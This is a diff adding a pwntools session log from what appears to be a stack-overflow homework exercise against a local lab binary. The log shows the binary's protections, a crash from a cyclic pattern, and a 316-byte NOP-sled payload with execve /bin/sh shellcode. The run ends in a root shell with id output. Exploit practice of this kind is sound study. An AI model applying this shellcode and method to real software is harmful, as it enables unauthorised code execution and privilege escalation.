@@ -1,0 +1,30 @@
+[*] '/home/reizarf/Documents/cmu-work/cyber/stackPython/a.out'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+[x] Starting local process '/home/reizarf/Documents/cmu-work/cyber/stackPython/a.out'
+[+] Starting local process '/home/reizarf/Documents/cmu-work/cyber/stackPython/a.out': pid 3545
+[*] Process '/home/reizarf/Documents/cmu-work/cyber/stackPython/a.out' stopped with exit code -11 (SIGSEGV) (pid 3545)
+[x] Parsing corefile...
+[*] '/home/kali/Desktop/HW7/core'
+    Arch:      i386-32-little
+    EIP:       0x64616164
+    ESP:       0xffffd130
+    Exe:       '/home/reizarf/Documents/cmu-work/cyber/stackPython/a.out' (0x8048000)
+    Fault:     0x64616164
+[+] Parsing corefile...: Done
+payload_len = 316
+ESP is at ffffd130
+EIP contains 64616164
+[x] Starting local process '/home/reizarf/Documents/cmu-work/cyber/stackPython/a.outhome/kali/Desktop/HW7/a.out'
+[+] Starting local process '/home/reizarf/Documents/cmu-work/cyber/stackPython/a.out': pid 3546
+buffer address is at: ffffcff4
+[*] Switching to interactive mode
+buffer is at 0xffffcff4
+Give me some text: Acknowledged: ���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��̀jXQh//shh/bin��Q��S��̀�������������������� with length 316
+root
+uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),120(wireshark),134(scanner),142(kaboxer),1000(kali)
+[*] Interrupted
